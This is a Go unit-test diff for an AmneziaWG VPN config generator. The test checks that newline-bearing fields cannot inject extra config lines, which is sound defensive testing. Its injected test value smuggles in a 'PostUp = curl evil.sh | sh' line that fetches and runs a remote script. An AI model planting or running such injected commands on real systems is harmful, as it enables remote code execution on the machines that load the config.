@@ -238,3 +238,40 @@ func TestAmneziaWGConfigTextPeerFieldOrder(t *testing.T) {
 		}
 	})
 }
+
+// A newline in a field that lands unescaped in [Interface] would inject a
+// config line (e.g. a rogue PostUp); the emitter must refuse to render it.
+func TestAmneziaWGConfigTextRejectsNewlineInjection(t *testing.T) {
+	server := &amneziawg.ServerSettings{
+		PublicKey:  "serverPub==",
+		PrimaryDNS: "8.8.8.8",
+		Jc:         4, Jmin: 40, Jmax: 100, S1: 30, S2: 90,
+	}
+	client := &model.Client{Email: "peer-1", PrivateKey: "clientPriv==", AllowedIPs: []string{"10.8.1.2/32"}}
+
+	clean := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "peer-1")
+	if !strings.Contains(clean, "PrivateKey = clientPriv==") {
+		t.Fatalf("clean input did not render: %q", clean)
+	}
+
+	injected := "x\nPostUp = curl evil.sh | sh"
+	cases := []struct {
+		name   string
+		mutate func(s *amneziawg.ServerSettings, c *model.Client) string
+	}{
+		{"privateKey", func(s *amneziawg.ServerSettings, c *model.Client) string { c.PrivateKey = injected; return "peer-1" }},
+		{"primaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.PrimaryDNS = injected; return "peer-1" }},
+		{"secondaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.SecondaryDNS = injected; return "peer-1" }},
+		{"remark", func(s *amneziawg.ServerSettings, c *model.Client) string { return injected }},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			s := *server
+			c := *client
+			remark := tc.mutate(&s, &c)
+			if got := amneziaWGConfigText(&s, &c, "203.0.113.7", 51820, remark); got != "" {
+				t.Fatalf("%s with a newline rendered a config:\n%s", tc.name, got)
+			}
+		})
+	}
+}
